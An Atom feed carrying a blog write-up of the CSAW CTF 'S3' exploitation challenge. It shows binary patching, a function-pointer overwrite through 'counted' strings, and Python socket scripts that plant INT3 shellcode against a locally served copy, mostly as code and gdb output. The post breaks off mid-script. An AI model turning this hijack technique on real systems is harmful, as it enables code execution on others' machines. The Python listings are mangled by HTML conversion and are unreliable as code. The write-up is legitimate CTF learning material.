<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Csaw | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/csaw/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-01-03T09:27:00+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Exploit 300: S3]]></title>
    <link href="http://barrebas.github.io/blog/2014/09/25/CSAW-s3/"/>
    <updated>2014-09-25T19:25:41+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/09/25/CSAW-s3</id>
    <content type="html"><![CDATA[<p>A while ago, we threw together a semi-official <a href="https://ctf-team.vulnhub.com">VulnHub CTF team</a>. This team participated in the CSAW CTF. For me, it was a new and <em>humbling</em> experience. I didn&rsquo;t get a lot of flags but I managed to get this one.</p>

<!--more-->


<p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc 54.165.225.121 5333</code></pre></div></p>

<p>However, the connection timed out very quickly. I checked out the local copy with file:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file s3
s3: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped</code></pre></div></p>

<p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>

<p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>r
warning: Could not load shared library symbols <span class="k">for</span> linux-vdso.so.1.
Do you need <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nb">set </span>solib-search-path<span class="p">&amp;</span>rdquo<span class="p">;</span> or <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nb">set </span>sysroot<span class="p">&amp;</span>rdquo<span class="p">;</span>?
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;c <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> - Create the string <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> as <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span>
                    Types are:
                        <span class="m">0</span> - NULL-Terminated String
                        <span class="m">1</span> - Counted String
r <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Read the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
u <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>   - Update the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> to <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>
d <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Destroy the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
x                 - Exit Amazon S3
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;&lt;p&gt;Program received signal SIGALRM, Alarm clock.</code></pre></div></p></blockquote>

<p><img src="/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>

<p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>objdump -d s3 <span class="p">|</span> grep alarm
<span class="m">0000000000401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;:
  402126:   e8 d5 f1 ff ff          callq  <span class="m">401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;
  403771:   e8 8a db ff ff          callq  <span class="m">401300</span> <span class="p">&amp;</span>lt<span class="p">;</span>alarm@plt&gt;</code></pre></div></p>

<p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>

<p>The binary allows the storage of two types of strings: NULL-terminated and so-called &ldquo;counted&rdquo; strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.</p>

<p><img src="/assets/s3-NULL-string.png" alt="s3: NULL-terminated strings, no problems!" /></p>

<p>Next, the obvious target was the &ldquo;counted&rdquo; string. I created a string &ldquo;bleh&rdquo;, updated it to &ldquo;blehbleh&rdquo; and tried to read from it&hellip; segfault! Awesome, we have a lead.</p>

<p><img src="/assets/s3-countedstring-segfault.png" alt="s3: counted strings... Oops!" /></p>

<p>Time to fire up <code>gdb</code> again and try to reproduce the crash:</p>

<p><img src="/assets/s3-reproduced-crash.png" alt="s3: success! Let's see what's going on." /></p>

<p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">=</span>&gt; 0x4019d6:    call   QWORD PTR <span class="o">[</span>rax+0x10<span class="o">]</span></code></pre></div></p>

<p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>

<p><img src="/assets/strings.png" alt="s3: exploitation flow" /></p>

<p>We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode&hellip; confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:</p>

<p><img src="/assets/s3-gdb-id-is-address.png" alt="s3: memory addresses as string identifiers" /></p>

<p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> nc -e ./s3 -v -l -p 5333<span class="p">;</span> <span class="k">done</span></code></pre></div></p>

<p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())&amp;lt;  &lt;br/&gt;</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="n">CTF</span><span class="err">!</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">first</span> <span class="n">location</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="n">AAAA</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">second</span> <span class="n">location</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>

<p>After running this (and careful debugging of the script) I got a coredump:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python ./amaz.py
Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;c <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> - Create the string <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span> as <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>gt<span class="p">;</span>
                    Types are:
                        <span class="m">0</span> - NULL-Terminated String
                        <span class="m">1</span> - Counted String
r <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Read the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
u <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>   - Update the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span> to <span class="p">&amp;</span>lt<span class="p">;</span>string<span class="p">&amp;</span>gt<span class="p">;</span>
d <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>            - Destroy the string referenced by <span class="p">&amp;</span>lt<span class="p">;</span>id<span class="p">&amp;</span>gt<span class="p">;</span>
x                 - Exit Amazon S3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> first <span class="nv">location</span> <span class="o">=</span> 0x00b10030
<span class="o">[</span>+<span class="o">]</span> second <span class="nv">location</span> <span class="o">=</span> 0x00b10050
bas@tritonal:~/documents/s3 writeup<span class="nv">$ </span>gdb ./s3 core
<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span>
gdb-peda<span class="nv">$ </span>i r
rax            0x41414141   0x41414141</code></pre></div></p>

<p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&gt;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span></code></pre></div></p>

<p>Which obviously still crashes, because now the binary executes:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;0  0x0000000021465443 in ?? <span class="o">()</span>&lt;/h1&gt;

&lt;p&gt;</code></pre></div></p>

<p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">xCC</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
